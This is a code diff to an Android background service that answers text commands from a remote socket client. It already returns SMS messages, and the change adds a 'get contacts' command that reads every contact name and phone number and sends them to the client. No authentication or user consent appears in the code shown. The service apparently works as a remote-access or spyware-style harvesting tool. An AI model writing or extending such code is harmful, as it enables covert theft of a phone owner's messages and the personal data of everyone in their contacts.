@@ -10,6 +10,7 @@ import android.graphics.Color;
 import android.net.Uri;
 import android.net.wifi.WifiManager;
 import android.os.IBinder;
+import android.provider.ContactsContract;
 import android.text.format.Formatter;
 import android.util.Base64;
 import android.util.Log;
@@ -135,6 +136,12 @@ public class MyService extends Service {
                             outputStream.flush();
                             Log.d(TAG, "bytes sent to client:" + sms.length());
                         }
+                        else if (strFromClient.toLowerCase().trim().equals("get contacts")){
+                            String contacts = getContacts();
+                            outputStream.write(contacts.getBytes());
+                            outputStream.flush();
+                            Log.d(TAG, "bytes sent to client:" + contacts.length());
+                        }
 
                         outputStream.close();
                         inputStream.close();
@@ -209,6 +216,20 @@ public class MyService extends Service {
             Log.d(TAG, "date parsing exception:" + pe.toString());
         }
         return finalDateString;
+    }
+
+    public String getContacts(){
+        String finalResult = "";
+        Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,null,null, null);
+        String contactData="", colName="", value="";
+        while (cursor.moveToNext())
+        {
+            String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+            String phoneNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+            finalResult += name + ";" + phoneNumber + "\r\n";
+        }
+        cursor.close();
+        return finalResult;
     }
 
     private int currentTextColor = Color.GREEN;
